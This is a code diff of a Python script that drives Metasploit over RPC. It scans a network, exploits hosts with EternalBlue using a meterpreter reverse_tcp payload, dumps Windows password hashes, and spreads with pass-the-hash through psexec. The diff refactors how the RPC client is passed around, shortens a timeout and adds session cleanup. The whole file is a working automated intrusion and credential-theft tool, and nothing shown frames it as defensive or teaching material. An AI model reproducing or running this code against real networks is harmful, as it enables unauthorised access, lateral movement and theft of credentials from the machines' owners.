@@ -90,8 +90,7 @@ def nmScan(ip):
                 targets.append(host_obj)
     return targets
 
-def passTheHash(ip, localip, hashlist):
-    client = setupRPC()
+def passTheHash(ip, localip, hashlist, client):
     print('Attempting to access ' + str(ip) + ' with hash list...')
     exploit = client.modules.use('exploit', 'windows/smb/psexec')
     exploit['RHOST'] = ip
@@ -109,9 +108,8 @@ def passTheHash(ip, localip, hashlist):
     return None
     
 
-def eternalBlue(ip, localip):
+def eternalBlue(ip, localip, client):
     print('Attempting to exploit ' + str(ip) + ' to gain access to the network...')
-    client = setupRPC()
     # Load eternal blue exploit
     exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
     exploit['RHOST'] = ip
@@ -119,34 +117,35 @@ def eternalBlue(ip, localip):
     payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
     payload['LHOST'] = localip
     hashes = runExploit(client, exploit, payload)
-    print('Gained ' + str(len(hashes)) + ' hashes from ' + str(ip) + '...')
-    return hashes
+    if hashes != None:
+        print('Gained ' + str(len(hashes)) + ' hashes from ' + str(ip) + '...')
+        return hashes
+    return None
 
 def runExploit(client, exploit, payload):
     # Exploit the host
     proc = exploit.execute(payload=payload)
     jobId = proc.get('job_id') + 1 # add 1 because pymetasploit is horribly written
-    timeout = 100
+    timeout = 50
     count = 0
-    print('waiting for session')
     while(jobId not in client.sessions.list.keys() and count < timeout):
         time.sleep(3)
         count += 1
     if count >= timeout:
+        client.sessions.session(jobId).kill()
         return None
-    print('Got session')
     # Get the shell and run the hashdump
     shell = client.sessions.session(jobId)
     if shell == None:
         return None
     shell.runsingle('run post/windows/gather/hashdump')
-    print('running hashdump')
     while(True):
         output = shell.read()
         if(':::' in output):
             hashes = gatherHashes(output)
-            shell.kill()
+            client.sessions.session(jobId).kill()
             return hashes
+    client.sessions.session(jobId).kill()
     return None
 
 def getArgs(argv):
@@ -173,10 +172,12 @@ def main():
         return
     targets = nmScan(args['targetIp'])
     print('Found ' + str(len(targets)) + ' possibly vulnerable machines...')
+
+    client = setupRPC()
     # Try to break into machines with eternal blue
     hashes = []
     for i in range(len(targets)):
-        hashData = eternalBlue(targets[i].get('ip'), args['localIp'])
+        hashData = eternalBlue(targets[i].get('ip'), args['localIp'], client)
         if hashData != None:
             targets.pop(i)
             hashes = hashData
@@ -185,10 +186,9 @@ def main():
         # Found access to network start spidering
         print('Starting hash passing...')
         for i in range(len(targets)):
-            newHashes = passTheHash(args['targetIp'], args['localIp'], hashes)
+            newHashes = passTheHash(args['targetIp'], args['localIp'], hashes, client)
             if newHashes != None:
                 print('Adding ' + str(len(newHashes)) + ' to the hash list')
-                print(newHashes)
                 mergeList(hashes, newHashes)
                 targets.pop(i)
     else:
